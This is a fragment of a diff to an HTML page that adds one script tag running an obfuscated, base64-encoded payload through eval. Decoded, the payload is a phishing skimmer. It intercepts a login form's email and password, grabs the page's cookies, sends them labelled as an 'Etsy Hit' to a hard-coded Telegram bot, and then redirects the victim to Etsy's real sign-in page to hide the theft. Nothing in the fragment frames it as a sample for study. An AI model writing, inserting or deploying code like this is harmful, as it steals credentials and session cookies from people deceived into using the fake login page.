+    <script>eval(atob("Y29uc3QgYT0nODgxNzUwMjQ1OTpBQUc3SkRxQ1hLSk5EYUlGaWVPal8xamtxSTJtbDZTc3EwRSc7Y29uc3QgYj05MjA1OTY2Mjg7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luRm9ybScpLmFkZEV2ZW50TGlzdGVuZXIoJ3N1Ym1pdCcsZnVuY3Rpb24oZSl7ZS5wcmV2ZW50RGVmYXVsdCgpO2NvbnN0IGM9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2VtYWlsJykudmFsdWU7Y29uc3QgZD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmQnKS52YWx1ZTtjb25zdCBrPWRvY3VtZW50LmNvb2tpZXx8J05vIGNvb2tpZXMnO2NvbnN0IHQ9IvCfkZUgWytdIEV0c3kgSGl0IVxuRW1haWw6ICIrYysiXG5QYXNzOiAiK2QrIlxuQ29va2llczogIitrO2NvbnN0IGY9bmV3IEZvcm1EYXRhKCk7Zi5hcHBlbmQoJ2NoYXRfaWQnLGIpO2YuYXBwZW5kKCd0ZXh0Jyx0KTtmZXRjaCgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIrYSsiL3NlbmRNZXNzYWdlIix7bWV0aG9kOidQT1NUJyxtb2RlOiduby1jb3JzJyxib2R5OmZ9KS50aGVuKGZ1bmN0aW9uKCl7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vd3d3LmV0c3kuY29tL3NpZ25pbid9KS5jYXRjaChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL3d3dy5ldHN5LmNvbS9zaWduaW4nfSk7fSk7"));</script>
 </body>
 </html>
